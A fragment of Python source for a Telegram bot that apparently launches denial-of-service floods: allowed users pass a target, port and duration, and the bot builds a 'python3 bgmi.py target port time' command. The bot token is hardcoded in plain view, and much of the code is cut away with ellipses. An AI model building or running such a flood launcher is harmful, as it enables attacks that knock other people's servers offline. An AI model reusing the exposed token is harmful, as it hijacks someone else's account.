...
bot = telebot.TeleBot('6582836431:AAFf3fTsi09LhkkwU1tagSvjuaNmJ08F4P8')
    ...
    if user_id in allowed_user_ids and check_access(user_id):
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 241:
                ...
                full_command = f"python3 bgmi.py {target} {port} {time}"
